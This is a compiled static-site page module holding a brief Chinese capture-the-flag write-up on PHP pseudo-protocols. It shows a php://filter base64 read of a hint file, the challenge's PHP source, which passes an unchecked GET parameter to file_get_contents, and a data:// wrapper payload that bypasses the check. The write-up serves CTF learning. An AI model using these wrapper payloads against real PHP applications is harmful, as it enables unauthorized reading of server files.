import{_ as s,o as n,c as a,e}from"./app-b1c518ef.js";const t={},p=e(`<p>#PHP 伪协议</p><p>php://filter/convert.base64-encode/resource=hint.php =&gt; PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</p><p>base64decode</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//go to /test2222222222222.php</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因此</p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">1.14.71.254</span></span><span class="token port-segment"><span class="token port-delimiter">:</span><span class="token port">28194</span></span></span><span class="token path"><span class="token path-separator">/</span>test2222222222222.php</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;max_execution_time&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;180&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;flag.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$a</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;a&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;r&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">&#39;I want flag&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;success\\n&quot;</span><span class="token punctuation">;</span>       
	    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用 data 协议绕过</p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">a</span>=<span class="token value">data://text/plain,I</span></span></span> want flag
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,9),o=[p];function l(c,i){return n(),a("div",null,o)}const r=s(t,[["render",l],["__file","PseudoProtocols.html.vue"]]);export{r as default};